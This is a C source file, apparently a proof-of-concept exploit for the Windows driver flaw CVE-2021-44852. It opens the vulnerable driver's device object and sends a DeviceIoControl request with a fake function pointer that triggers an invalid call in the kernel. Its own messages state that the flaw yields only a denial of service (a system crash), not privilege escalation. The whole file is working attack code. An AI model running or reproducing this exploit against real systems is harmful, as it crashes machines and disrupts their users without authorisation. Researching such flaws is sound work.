#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(TARGET_DEVICE_OBJECT, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0;
	unsigned char unused = 0, output[2048];

	RtlSecureZeroMemory(&output, sizeof(output));

	SetConsoleTitleA("CVE-2021-44852");

	printf("[*] CVE-2021-44852 Untrusted Function Pointer Elevation of Privilege Vulnerability\n[*] Exploit written by ExAllocatePool2\n[!] After further analysis, this is actually a false vulnerability report, and can only achieve a denial of service condition.\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the vulnerable device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the vulnerable device driver. Handle Value: 0x%p\n<---------------- | Entering Danger Zone | ---------------->\n[!] Triggering an invalid function call to \"nt!IoStartPacket\" in 3...", h_driver);

	Sleep(1000);
	for (int i = 2; i > 0; i--)
	{
		printf("\n[!] %d...", i);
		Sleep(1000);
	}
	DeviceIoControl(h_driver, TARGET_BRANCH, 0x4141414142424242, 8, &output, sizeof(output), &bytes_returned, 0);

	printf("\n<---------------- | Leaving Danger Zone | ---------------->\n[+] Exploitation failed; the machine should have crashed ):");
	unused = getchar();
	return 0;
}